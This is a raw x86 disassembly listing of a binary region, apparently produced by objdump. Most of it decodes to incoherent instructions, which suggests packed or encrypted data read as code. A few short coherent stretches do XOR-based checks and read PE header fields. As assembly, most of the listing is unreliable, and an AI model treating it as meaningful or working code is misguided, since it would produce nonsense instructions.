  40beb0:	xlat   BYTE PTR ds:[ebx]
  40beb1:	push   ebp
  40beb2:	out    0x8b,al
  40beb4:	cmp    edx,DWORD PTR [edi+0x5d2853cb]
  40beba:	inc    esp
  40bebb:	xor    eax,0x6bd20c66
  40bec0:	sub    DWORD PTR [ebx+0x33],esi
  40bec3:	push   esp
  40bec4:	mov    esi,0x7e2022f4
  40bec9:	test   BYTE PTR ds:[esi+0x19711f0c],dh
  40bed0:	cmp    bh,al
  40bed2:	or     eax,0x9b61548d
  40bed7:	pop    eax
  40bed8:	xor    eax,0xc73fab3e
  40bedd:	cmp    eax,0xdd356e21
  40bee2:	pop    ebx
  40bee3:	push   ss
  40bee4:	pop    ebx
  40bee5:	fsub   st,st(4)
  40bee7:	cdq    
  40bee8:	pusha  
  40bee9:	ror    BYTE PTR ds:0xfd068fa,1
  40beef:	(bad)  
  40bef0:	xor    BYTE PTR [eax],cl
  40bef2:	jno    0x40bf22
  40bef4:	idiv   esi
  40bef6:	xchg   dh,ah
  40bef8:	inc    ecx
  40bef9:	nop
  40befa:	cmp    BYTE PTR [edi-0x5f],dh
  40befd:	fisub  DWORD PTR [ebp+0x68ee7c17]
  40bf03:	call   0xbb720a97
  40bf08:	test   BYTE PTR [eax+0x35],dh
  40bf0b:	shl    BYTE PTR ds:0x120efe54,0x9a
  40bf12:	cmp    eax,0xc9806de9
  40bf17:	test   al,0x2d
  40bf19:	js     0x40bf4f
  40bf1b:	or     DWORD PTR [ebx],0xffffffd7
  40bf1e:	mov    ebx,0x9ce84c85
  40bf23:	sahf   
  40bf24:	leave  
  40bf25:	xchg   esp,eax
  40bf26:	mov    edi,0xc65b3240
  40bf2b:	sbb    ebx,DWORD PTR [ecx+0x58454e6c]
  40bf31:	add    al,0x26
  40bf33:	push   ebx
  40bf34:	jnp    0x40bf78
  40bf36:	call   0xea36:0x4743
  40bf3c:	sub    bh,ch
  40bf3e:	inc    eax
  40bf3f:	mov    ebp,0x99f211f3
  40bf44:	add    esp,ebp
  40bf46:	xchg   esp,eax
  40bf47:	inc    ebp
  40bf48:	or     ch,BYTE PTR [ebx-0x5790f440]
  40bf4e:	sub    esi,DWORD PTR [edi+ecx*4-0x43e7ad11]
  40bf55:	shr    al,1
  40bf57:	inc    ecx
  40bf58:	cmp    DWORD PTR [ebp+ebx*2-0x24],0xfffffff8
  40bf5d:	aad    0x73
  40bf5f:	xchg   edi,eax
  40bf60:	arpl   WORD PTR [ebx+0x31],di
  40bf63:	test   ax,0x7697
  40bf67:	jbe    0x40bef2
  40bf69:	int    0x8b
  40bf6b:	push   cs
  40bf6c:	cmp    eax,0xba64ac32
  40bf71:	imul   edi,esi,0xffffffb7
  40bf74:	xchg   BYTE PTR [esi-0x4c9925a6],ch
  40bf7a:	pop    ebx
  40bf7b:	or     DWORD PTR [ebx+0x8fdd6e7],0xffffffc3
  40bf82:	xor    al,0x9e
  40bf84:	pop    es
  40bf85:	or     bl,dh
  40bf87:	cmp    al,0x6d
  40bf89:	aaa    
  40bf8a:	mov    eax,esp
  40bf8c:	rcl    BYTE PTR [edi+esi*2-0x32],0x65
  40bf91:	xor    DWORD PTR [eax],esi
  40bf93:	jecxz  0x40bf88
  40bf95:	adc    al,0x0
  40bf97:	cmp    al,0x8d
  40bf99:	or     al,0xd
  40bf9b:	mov    edx,DWORD PTR ds:0x3db8232f
  40bfa1:	ret    
  40bfa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfa3:	sahf   
  40bfa4:	stc    
  40bfa5:	mov    DWORD PTR [eax+0x22e5ef79],esi
  40bfab:	push   ss
  40bfac:	pop    ecx
  40bfad:	je     0x40bfaa
  40bfaf:	add    eax,0x5da43745
  40bfb4:	sti    
  40bfb5:	sbb    esi,DWORD PTR [ecx]
  40bfb7:	dec    edi
  40bfb8:	clc    
  40bfb9:	and    al,0x2e
  40bfbb:	add    al,0x34
  40bfbd:	pop    ss
  40bfbe:	std    
  40bfbf:	adc    BYTE PTR [edx-0x72b48601],bh
  40bfc5:	mov    ecx,0x31b3df3
  40bfca:	(bad)  
  40bfcb:	iret   
  40bfcc:	rcl    esp,0x36
  40bfcf:	cmp    eax,0xd0ea2dda
  40bfd4:	dec    ebp
  40bfd5:	push   eax
  40bfd6:	enter  0xed34,0x6d
  40bfda:	and    eax,DWORD PTR [edi+0x243963e2]
  40bfe0:	rcr    ebp,cl
  40bfe2:	jo     0x40bf9e
  40bfe4:	add    DWORD PTR [ecx],edi
  40bfe6:	sub    al,0xbe
  40bfe8:	mov    ch,0x19
  40bfea:	in     eax,0xd3
  40bfec:	call   0x869f:0x863043fe
  40bff3:	int3   
  40bff4:	retf   0x3029
  40bff7:	cmp    ah,BYTE PTR [eax]
  40bff9:	sti    
  40bffa:	out    dx,eax
  40bffb:	add    DWORD PTR [eax+0x65d9c6bc],esp
  40c001:	and    al,0xc6
  40c003:	(bad)  [esp+esi*2]
  40c006:	sub    ah,BYTE PTR [eax]
  40c008:	add    cl,BYTE PTR [esi+0x51]
  40c00b:	out    0x70,al
  40c00d:	push   0xffffffb7
  40c00f:	cmp    DWORD PTR [ecx-0x658a1b69],0xfffffff3
  40c016:	inc    esp
  40c017:	xor    edx,DWORD PTR [esi]
  40c019:	ds pop esi
  40c01b:	jno    0x40c041
  40c01d:	or     eax,0x8ecf2efd
  40c022:	sahf   
  40c023:	(bad)
  40c026:	ja     0x40c015
  40c028:	cmp    esi,DWORD PTR [eax-0x7643ab2a]
  40c02e:	cmp    al,0x2f
  40c030:	test   BYTE PTR [edi+0x41e5fda],ch
  40c036:	xchg   ebx,eax
  40c037:	push   ss
  40c038:	(bad)  
  40c039:	jle    0x40bfee
  40c03b:	call   0x97cd:0x7a29b4d9
  40c042:	scas   al,BYTE PTR es:[edi]
  40c043:	xchg   esp,eax
  40c044:	sbb    bh,BYTE PTR [ebp-0x2a]
  40c047:	cmp    eax,0x6b415697
  40c04c:	dec    esp
  40c04d:	mov    edi,0x4b21ad2d
  40c052:	outs   dx,DWORD PTR ds:[esi]
  40c053:	sub    esi,DWORD PTR [edx]
  40c055:	aam    0xdc
  40c057:	sub    eax,DWORD PTR [eax+esi*2-0x3f]
  40c05b:	mov    esp,0xab8a3745
  40c060:	arpl   WORD PTR [ebx],ax
  40c062:	in     eax,0x14
  40c064:	xor    DWORD PTR [eax],esi
  40c066:	mov    ah,0x85
  40c068:	jg     0x40c063
  40c06a:	(bad)  
  40c06b:	pop    esp
  40c06c:	popa   
  40c06d:	xor    DWORD PTR [ecx-0x4c],esp
  40c070:	sti    
  40c071:	scas   eax,DWORD PTR es:[edi]
  40c072:	call   0x12203a89
  40c077:	retf   0x3c95
  40c07a:	push   edx
  40c07b:	xchg   BYTE PTR [eax],ah
  40c07d:	repz scas al,BYTE PTR es:[edi]
  40c07f:	fst    QWORD PTR [esi-0x16]
  40c082:	ss xchg edi,eax
  40c084:	or     al,0xf5
  40c086:	dec    ebp
  40c087:	icebp  
  40c088:	sar    BYTE PTR [ebx-0x74],0xbc
  40c08c:	push   ecx
  40c08d:	test   DWORD PTR ds:0x99229ae8,esi
  40c093:	popa   
  40c094:	data16 add al,0xd5
  40c097:	jb     0x40c0eb
  40c099:	in     al,0x77
  40c09b:	sbb    DWORD PTR [esi+0x4e00a8f4],esi
  40c0a1:	in     eax,0x6c
  40c0a3:	sbb    eax,0xf12e13f8
  40c0a8:	or     BYTE PTR [edi],al
  40c0aa:	xchg   edi,eax
  40c0ab:	sbb    DWORD PTR [edx+0x4e],0x56201a0
  40c0b2:	jmp    0x40c0ff
  40c0b4:	jns    0x40c108
  40c0b6:	pop    ds
  40c0b7:	mov    ch,0xcb
  40c0b9:	out    0x27,eax
  40c0bb:	int    0xa2
  40c0bd:	ror    DWORD PTR cs:[edi+0x2e3db5d0],1
  40c0c4:	sub    BYTE PTR [edi+edi*2-0x749937d5],0x45
  40c0cc:	cld    
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	scas   al,BYTE PTR es:[edi]
  40c104:	and    bh,BYTE PTR [eax]
  40c106:	(bad)  
  40c107:	imul   edi,ebx,0x7d2e7e7e
  40c10d:	jle    0x40c18d
  40c10f:	sbb    al,0xff
  40c111:	in     al,dx
  40c112:	(bad)  
  40c113:	push   esp
  40c114:	addr16 (bad) 
  40c116:	dec    esp
  40c117:	ds inc ebx
  40c119:	sbb    al,0xfb
  40c11b:	cmp    ecx,esi
  40c11d:	in     eax,0xe7
  40c11f:	leave  
  40c120:	adc    ch,BYTE PTR [ecx+0x4c7f69e6]
  40c126:	rcl    DWORD PTR [ebx-0x25a2a09b],0x8a
  40c12d:	jo     0x40c0f7
  40c12f:	sub    BYTE PTR [eax+0x7b],cl
  40c132:	hlt    
  40c133:	cmp    al,0x3c
  40c135:	add    BYTE PTR [edx],al
  40c137:	das    
  40c138:	dec    edi
  40c139:	cmp    ebp,DWORD PTR [ecx-0x7b7c6820]
  40c13f:	out    0x37,al
  40c141:	adc    al,0x7f
  40c143:	mov    edi,0x24001b69
  40c148:	call   0xf4bd3377
  40c14d:	sub    al,0xb0
  40c14f:	mov    ?,WORD PTR [esi+ecx*1]
  40c152:	retf   
  40c153:	sahf   
  40c154:	repz int 0xd
  40c157:	pop    edi
  40c158:	push   cs
  40c159:	(bad)  
  40c15a:	mov    al,ds:0xe2ada8e8
  40c15f:	shl    ebx,0x8b
  40c162:	xor    bl,0x90
  40c165:	std    
  40c166:	xchg   ebp,eax
  40c167:	jmp    0x40c1d1
  40c169:	inc    ecx
  40c16a:	into   
  40c16b:	mov    edx,0xecf2c4e0
  40c170:	ins    BYTE PTR es:[edi],dx
  40c171:	rol    BYTE PTR [eax+0x4a3ba409],1
  40c177:	loopne 0x40c1f4
  40c179:	cmp    eax,0x1f07e9b5
  40c17e:	mov    ecx,0x2967ed11
  40c183:	xor    al,0x2d
  40c185:	adc    cl,dl
  40c187:	enter  0x27bb,0xf
  40c18b:	lods   al,BYTE PTR ds:[esi]
  40c18c:	repnz cld 
  40c18e:	test   DWORD PTR [ecx+0x2f],edi
  40c191:	pop    ebp
  40c192:	imul   edi,DWORD PTR [ebx],0x2c
  40c195:	jnp    0x40c18d
  40c197:	mov    ds,WORD PTR [ebx-0x79]
  40c19a:	mov    DWORD PTR [edx],ecx
  40c19c:	cmp    DWORD PTR [ebx+0x787a9469],ecx
  40c1a2:	fs and al,0xd5
  40c1a5:	inc    ebx
  40c1a6:	ret    0xdcab
  40c1a9:	das    
  40c1aa:	cmp    dl,BYTE PTR gs:[eax-0x3c]
  40c1ae:	cmc    
  40c1af:	xchg   esp,eax
  40c1b0:	test   eax,0x66996ff6
  40c1b5:	and    DWORD PTR [ebp+0x5583239e],esp
  40c1bb:	(bad)  
  40c1bc:	mov    esi,0x8ffa1bb3
  40c1c1:	daa    
  40c1c2:	scas   al,BYTE PTR es:[edi]
  40c1c3:	or     al,0x2d
  40c1c5:	mov    cl,0xaa
  40c1c7:	into   
  40c1c8:	ret    0x49e
  40c1cb:	inc    esp
  40c1cc:	or     eax,0x8a5ea07d
  40c1d1:	in     eax,0x46
  40c1d3:	cli    
  40c1d4:	mov    esp,DWORD PTR [ebx+0x5d98ae5e]
  40c1da:	pop    ecx
  40c1db:	push   ss
  40c1dc:	mov    edi,0x3a7940ee
  40c1e1:	dec    eax
  40c1e2:	or     eax,0x91ef179a
  40c1e7:	dec    ebx
  40c1e8:	fsubrp st(5),st
  40c1ea:	mov    eax,ds:0xc529cc72
  40c1ef:	dec    ebp
  40c1f0:	xchg   ebx,eax
  40c1f1:	fidiv  WORD PTR [edx-0x409c6758]
  40c1f7:	mov    esi,0x8158c824
  40c1fc:	fimul  DWORD PTR [edx-0x51744239]
  40c202:	or     eax,0x31643300
  40c207:	and    esi,DWORD PTR [ebx+0x2d]
  40c20a:	sub    DWORD PTR [ebx+edi*1+0x4e5f1d91],esi
  40c211:	out    0x85,eax
  40c213:	mov    edx,0xf7b3250a
  40c218:	jne    0x40c27d
  40c21a:	push   edi
  40c21b:	sub    ah,BYTE PTR [edx]
  40c21d:	push   edi
  40c21e:	inc    eax
  40c21f:	enter  0x58cd,0x8
  40c223:	lock icebp 
  40c225:	adc    BYTE PTR [ebp+0x58],al
  40c228:	or     dl,dl
  40c22a:	int3   
  40c22b:	xchg   edi,eax
  40c22c:	sbb    esi,ebp
  40c22e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c22f:	ficom  DWORD PTR [edi]
  40c231:	mov    dl,0xff
  40c233:	inc    ecx
  40c234:	xor    ecx,DWORD PTR [edi]
  40c236:	aad    0x86
  40c238:	xchg   edi,eax
  40c239:	cmp    edi,DWORD PTR [ebx+0x40350296]
  40c23f:	popf   
  40c240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c241:	int3   
  40c242:	sbb    DWORD PTR [eax],esi
  40c244:	mov    ecx,0x20a1f469
  40c249:	xor    BYTE PTR ds:0xab391c2c,bh
  40c24f:	fwait
  40c250:	ins    DWORD PTR es:[edi],dx
  40c251:	test   DWORD PTR [edx],0x95390607
  40c257:	loope  0x40c2bc
  40c259:	cwde   
  40c25a:	fcom   DWORD PTR [ecx]
  40c25c:	xchg   DWORD PTR [ebx+0x5e5224b7],edi
  40c262:	(bad)  
  40c263:	jle    0x40c240
  40c265:	(bad)  
  40c266:	popf   
  40c267:	mov    ah,0x84
  40c269:	js     0x40c2b7
  40c26b:	cmp    eax,0xb553478
  40c270:	and    eax,0xe32702e6
  40c275:	jle    0x40c2c6
  40c277:	pop    edx
  40c278:	(bad)  
  40c279:	lods   eax,DWORD PTR ds:[esi]
  40c27a:	sub    eax,DWORD PTR ds:0x90483b4
  40c280:	sahf   
  40c281:	add    al,0xc3
  40c283:	fcom   st(4)
  40c285:	xchg   ebp,eax
  40c286:	sar    BYTE PTR [di-0x721d],1
  40c28b:	scas   al,BYTE PTR es:[edi]
  40c28c:	and    BYTE PTR [ebx],dl
  40c28e:	mov    bh,0xca
  40c290:	fcom   QWORD PTR [ebx+ecx*2-0x3]
  40c294:	lods   eax,DWORD PTR ds:[esi]
  40c295:	in     eax,dx
  40c296:	ins    DWORD PTR es:[edi],dx
  40c297:	ror    al,cl
  40c299:	stc    
  40c29a:	int    0xcc
  40c29c:	mov    al,0xdb
  40c29e:	cmp    eax,0xec5ccc8c
  40c2a3:	xlat   BYTE PTR ds:[ebx]
  40c2a4:	cmc    
  40c2a5:	xchg   esp,eax
  40c2a6:	fidiv  WORD PTR [esi+eax*2]
  40c2a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2aa:	mov    edi,0xad714c4f
  40c2af:	and    BYTE PTR [ecx],ch
  40c2b1:	(bad)  
  40c2b2:	imul   esp,DWORD PTR [edi+0x25],0xc1aea5b5
  40c2b9:	xchg   BYTE PTR [ebp+0x11475379],bh
  40c2bf:	(bad)  
  40c2c0:	imul   eax,DWORD PTR [ecx+0x24],0x75fa700d
  40c2c7:	(bad)  
  40c2c9:	ret    0xee54
  40c2cc:	dec    ebx
  40c2cd:	aas    
  40c2ce:	inc    ecx
  40c2cf:	mov    ds:0x494e704b,al
  40c2d4:	sub    BYTE PTR [eax-0x5e],ah
  40c2d7:	pop    edi
  40c2d8:	lock ret 0x8825
  40c2dc:	xlat   BYTE PTR ds:[ebx]
  40c2dd:	mov    gs,WORD PTR [esi-0x343e05f0]
  40c2e3:	pop    edx
  40c2e4:	cmp    eax,0x50af895b
  40c2e9:	loopne 0x40c325
  40c2eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2ec:	fdivrp st(5),st
  40c2ee:	(bad)  
  40c2ef:	xchg   esi,eax
  40c2f0:	aam    0xd8
  40c2f2:	mov    eax,0xf9192b2
  40c2f7:	or     DWORD PTR [edi-0x7be65524],ebx
  40c2fd:	pop    edi
  40c2fe:	jecxz  0x40c369
  40c300:	int    0x3c
  40c302:	test   eax,0xaf77ed5e
  40c307:	jmp    0xbf18:0x7c7745db
  40c30e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c30f:	and    BYTE PTR [ecx+ebp*2-0x7fc9172b],dl
  40c316:	ins    BYTE PTR es:[edi],dx
  40c317:	xchg   esp,eax
  40c318:	fsub   QWORD PTR [edx]
  40c31a:	cmp    eax,0x23260f67
  40c31f:	setl   dl
  40c322:	mov    eax,0xfe7be244
  40c327:	pop    ebp
  40c328:	fstp   DWORD PTR [edx+ebp*8-0x39]
  40c32c:	xchg   BYTE PTR [ebp+0x70197efe],ah
  40c332:	dec    ecx
  40c333:	or     eax,0x49357868
  40c338:	xor    BYTE PTR [ecx],ah
  40c33a:	mov    ds:0x476509cf,eax
  40c33f:	loopne 0x40c319
  40c341:	xor    al,0x48
  40c343:	pop    eax
  40c344:	bound  edi,QWORD PTR [esi]
  40c346:	jno    0x40c37b
  40c348:	sbb    dl,BYTE PTR [ecx-0x1c]
  40c34b:	or     BYTE PTR [ebp-0x61],cl
  40c34e:	dec    edi
  40c34f:	mov    ecx,0x82bbbbc7
  40c354:	test   al,0x34
  40c356:	xchg   edi,eax
  40c357:	push   cs
  40c358:	imul   esp,DWORD PTR [edx+ecx*8],0xffffffc9
  40c35c:	into   
  40c35d:	clc    
  40c35e:	mov    cs,WORD PTR [ebx-0x2a1736fd]
  40c364:	test   al,0x87
  40c366:	pop    eax
  40c367:	ret    0x27e0
  40c36a:	push   eax
  40c36b:	(bad)  
  40c36c:	je     0x40c308
  40c36e:	bswap  ebx
  40c370:	je     0x40c39f
  40c372:	loope  0x40c313
  40c374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c375:	cld    
  40c376:	test   DWORD PTR [ecx],ebp
  40c378:	nop
  40c379:	mov    al,ds:0xb59d0073
  40c37e:	adc    al,0xb7
  40c380:	pop    edi
  40c381:	sub    ch,ch
  40c383:	lock shl BYTE PTR [eax-0x75],1
  40c387:	jge    0x40c369
  40c389:	xor    ebx,0x552f5b2e
  40c38f:	cs dec esp
  40c391:	ret    0x20ab
  40c394:	cmp    al,0x97
  40c396:	into   
  40c397:	clc    
  40c398:	cwde   
  40c399:	test   al,0x2c
  40c39b:	jae    0x40c38a
  40c39d:	or     al,0xee
  40c39f:	enter  0x1ebb,0x28
  40c3a3:	sub    ah,BYTE PTR [edi]
  40c3a5:	mov    eax,ds:0x5b340307
  40c3aa:	cmp    BYTE PTR [edi-0x738a0cc8],ch
  40c3b0:	(bad)  
  40c3b1:	jecxz  0x40c350
  40c3b3:	test   DWORD PTR [ebp-0x2ddba1dc],edx
  40c3b9:	stc    
  40c3ba:	mov    al,BYTE PTR [edx]
  40c3bc:	cmp    bl,bl
  40c3be:	sar    edx,1
  40c3c0:	mov    esp,edx
  40c3c2:	daa    
  40c3c3:	xchg   DWORD PTR [edx+0x42],esp
  40c3c6:	mov    ebx,0xe957706e
  40c3cb:	push   edi
  40c3cc:	jle    0x40c41b
  40c3ce:	lea    ebp,[edx+ecx*1+0x50939aef]
  40c3d5:	or     bh,BYTE PTR [edx]
  40c3d7:	inc    ebp
  40c3d8:	mov    cl,cl
  40c3da:	push   ds
  40c3db:	jae    0x40c373
  40c3dd:	cdq    
  40c3de:	and    eax,0x34183fa8
  40c3e3:	jmp    0x40c3c4
  40c3e5:	stos   BYTE PTR es:[edi],al
  40c3e6:	dec    DWORD PTR ds:0xfe57f920
  40c3ec:	test   eax,0x440ac39f
  40c3f1:	dec    edx
  40c3f2:	push   esp
  40c3f3:	sbb    BYTE PTR [ebp-0xf88f3e7],al
  40c3f9:	repz or edx,DWORD PTR [esi-0x7182caa0]
  40c400:	lods   eax,DWORD PTR ds:[esi]
  40c401:	or     eax,0x5112222d
  40c406:	fidiv  DWORD PTR [eax]
  40c408:	adc    ecx,DWORD PTR [ecx+0x3]
  40c40b:	test   DWORD PTR [ecx-0x694c299d],esp
  40c411:	lods   eax,DWORD PTR ds:[esi]
  40c412:	pushf  
  40c413:	adc    BYTE PTR ds:0x38d536f,al
  40c419:	aas    
  40c41a:	mov    BYTE PTR [ebp+0x52d283e8],cl
  40c420:	repnz repnz outs dx,BYTE PTR ds:[esi]
  40c423:	mov    ch,0xf4
  40c425:	jo     0x40c41f
  40c427:	scas   al,BYTE PTR es:[edi]
  40c428:	inc    edi
  40c429:	push   ebx
  40c42b:	inc    eax
  40c42c:	les    esi,FWORD PTR ds:0x321ff96c
  40c432:	mov    dh,0xb6
  40c434:	adc    al,0xd1
  40c436:	arpl   WORD PTR [ebx],cx
  40c438:	adc    eax,esi
  40c43a:	sub    ecx,eax
  40c43c:	jno    0x40c466
  40c43e:	sub    eax,0x9b08848d
  40c443:	jb     0x40c477
  40c445:	add    BYTE PTR [esi-0x77],ah
  40c448:	inc    ebp
  40c449:	cld    
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi-0x73]
  40c49b:	mov    ds,WORD PTR [ecx]
  40c49d:	or     BYTE PTR [ecx],bl
  40c49f:	xchg   DWORD PTR [esi+0x7e],edi
  40c4a2:	cs jge 0x40c523
  40c4a5:	jle    0x40c454
  40c4a7:	cdq    
  40c4a8:	ret    
  40c4a9:	aam    0x19
  40c4ab:	fsqrt  
  40c4ad:	adc    cl,dh
  40c4af:	sbb    BYTE PTR [edi-0x23],bh
  40c4b2:	into   
  40c4b3:	sub    al,0x9f
  40c4b5:	xchg   edx,eax
  40c4b6:	rcl    ecx,0xe9
  40c4b9:	inc    esi
  40c4ba:	xor    edi,DWORD PTR [esi+0x37]
  40c4bd:	jno    0x40c47d
  40c4bf:	(bad)  
  40c4c0:	fcomp  st(4)
  40c4c2:	or     eax,eax
  40c4c4:	add    eax,0x5c585af0
  40c4c9:	popf   
  40c4ca:	int3   
  40c4cb:	test   al,0xac
  40c4cd:	jne    0x40c498
  40c4cf:	popf   
  40c4d0:	lea    esp,[edx]
  40c4d2:	jl     0x40c4b3
  40c4d4:	in     al,dx
  40c4d5:	fstp   QWORD PTR [ebx-0x36033441]
  40c4db:	dec    esi
  40c4dc:	je     0x40c522
  40c4de:	lahf   
  40c4df:	push   esi
  40c4e0:	adc    edi,ebp
  40c4e2:	not    BYTE PTR [edi+0x15557881]
  40c4e8:	cmp    eax,0xf04ae6c5
  40c4ed:	jbe    0x40c4d9
  40c4ef:	sbb    DWORD PTR ds:0x4684cd80,ecx
  40c4f5:	xchg   ecx,eax
  40c4f6:	int3   
  40c4f7:	xor    BYTE PTR [ebx-0x72d1ba37],dl
  40c4fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4fe:	cwde   
  40c4ff:	xchg   ecx,eax
  40c500:	inc    ecx
  40c501:	(bad)  
  40c502:	in     al,dx
  40c503:	(bad)  
  40c504:	scas   al,BYTE PTR es:[edi]
  40c505:	shl    BYTE PTR [ecx],cl
  40c507:	pop    ss
  40c508:	jno    0x40c584
  40c50a:	add    BYTE PTR [ecx-0x22],ah
  40c50d:	out    dx,eax
  40c50e:	mov    ebx,DWORD PTR [ecx-0x6d]
  40c511:	sub    eax,0x758a09a
  40c516:	xchg   edi,eax
  40c517:	sbb    BYTE PTR [eax*8-0x4b15e98b],al
  40c51e:	or     ah,BYTE PTR [eax-0x31cce18f]
  40c524:	inc    bx
  40c526:	xchg   ebp,eax
  40c527:	stos   DWORD PTR es:[edi],eax
  40c528:	pusha  
  40c529:	fucomp st(6)
  40c52b:	lods   eax,DWORD PTR ds:[esi]
  40c52c:	or     BYTE PTR ds:0x9b9d3631,bh
  40c532:	sbb    BYTE PTR [ebp+0xd],al
  40c535:	cmp    ah,BYTE PTR [ecx-0x286a456d]
  40c53b:	xchg   edx,eax
  40c53c:	(bad)  
  40c53d:	stc    
  40c53e:	gs xchg ebp,eax
  40c540:	sub    al,BYTE PTR [edx+eax*2-0x2c]
  40c544:	lods   al,BYTE PTR ds:[esi]
  40c545:	inc    eax
  40c546:	pop    ebp
  40c547:	inc    esp
  40c548:	cmp    ch,dl
  40c54a:	add    eax,0x77942b65
  40c54f:	pop    edi
  40c550:	and    ebp,DWORD PTR [esi]
  40c552:	or     eax,0x7d91948
  40c557:	mov    edi,ss
  40c559:	mov    ch,0x7c
  40c55b:	jno    0x40c55a
  40c55d:	inc    ecx
  40c55e:	fld    TBYTE PTR [eax+0x6a1b0cf4]
  40c564:	je     0x40c54d
  40c566:	or     cl,BYTE PTR [edi-0x314e34c6]
  40c56c:	jns    0x40c58b
  40c56e:	jmp    0x40c575
  40c570:	test   DWORD PTR [edi],esi
  40c572:	mov    BYTE PTR [ecx-0x6798a9f0],bh
  40c578:	pop    ecx
  40c579:	loopne 0x40c5b1
  40c57b:	mov    DWORD PTR [esi-0x18bcac5a],0x52cadb95
  40c585:	dec    esp
  40c586:	inc    edi
  40c587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c588:	in     eax,dx
  40c589:	cmp    eax,0x5dde4687
  40c58e:	or     BYTE PTR [edx+ebx*4+0x3d],0xa7
  40c593:	retf   0xb885
  40c596:	cdq    
  40c597:	int3   
  40c598:	push   edx
  40c599:	mov    ah,al
  40c59b:	push   edi
  40c59c:	sbb    eax,ebp
  40c59e:	push   cs
  40c59f:	test   al,0x3
  40c5a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5a2:	int    0x9e
  40c5a4:	out    0x58,eax
  40c5a6:	mov    al,ds:0x85098df7
  40c5ab:	retf   0x7758
  40c5ae:	loop   0x40c5bf
  40c5b0:	jecxz  0x40c5b9
  40c5b2:	sbb    al,0xe8
  40c5b4:	and    al,0x71
  40c5b6:	(bad)  fs:[eax+esi*2-0x18]
  40c5bb:	add    edx,edi
  40c5bd:	dec    ecx
  40c5be:	cld    
  40c5bf:	sbb    DWORD PTR [esi+0x1e0898ea],ebx
  40c5c5:	mov    bl,0xdb
  40c5c7:	jmp    0x40c632
  40c5c9:	jmp    0x40c555
  40c5cb:	es stos DWORD PTR es:[edi],eax
  40c5cd:	push   esp
  40c5ce:	cmp    ecx,DWORD PTR [ebx+edx*8]
  40c5d1:	cmp    al,0x6f
  40c5d3:	pop    edx
  40c5d4:	mul    edx
  40c5d6:	sbb    eax,0x64bab7f6
  40c5db:	inc    ecx
  40c5dc:	adc    DWORD PTR [esi+0x6b],ebx
  40c5df:	xchg   ecx,eax
  40c5e0:	push   0xe962fbe1
  40c5e5:	mov    ecx,0x181c1589
  40c5ea:	test   DWORD PTR [edi],esi
  40c5ec:	das    
  40c5ed:	sub    ah,ch
  40c5ef:	sub    esp,DWORD PTR [edi-0x3]
  40c5f2:	ins    DWORD PTR es:[edi],dx
  40c5f3:	(bad)  
  40c5f4:	in     eax,0x42
  40c5f6:	mov    bh,0x18
  40c5f8:	out    dx,eax
  40c5f9:	sti    
  40c5fa:	sbb    eax,0x3b1102ce
  40c5ff:	loope  0x40c631
  40c601:	ds adc al,0x29
  40c604:	les    esi,FWORD PTR [edi-0x63]
  40c607:	mov    al,0xfb
  40c609:	loope  0x40c62e
  40c60b:	ds push cs
  40c60d:	retf   0x187
  40c610:	test   dl,dh
  40c612:	test   al,0x3a
  40c614:	not    DWORD PTR [ebx]
  40c616:	jmp    0x40c5b8
  40c618:	sbb    al,dh
  40c61a:	sub    esi,DWORD PTR [ebx+0xd]
  40c61d:	scas   eax,DWORD PTR es:[edi]
  40c61e:	jecxz  0x40c5d0
  40c620:	lahf   
  40c621:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c622:	pop    ebp
  40c623:	pushf  
  40c624:	xor    eax,0x6e9c2775
  40c629:	jbe    0x40c60c
  40c62b:	outs   dx,BYTE PTR ds:[esi]
  40c62c:	dec    esp
  40c62d:	retf   
  40c62e:	mov    BYTE PTR [ebx+0x16],ch
  40c631:	or     BYTE PTR [ebx+0x71566c67],0xc9
  40c638:	pop    ds
  40c639:	lods   eax,DWORD PTR ds:[esi]
  40c63a:	movzx  ecx,si
  40c63d:	push   esi
  40c63e:	int    0x60
  40c640:	inc    ebp
  40c641:	hlt    
  40c642:	sub    al,0xde
  40c644:	lahf   
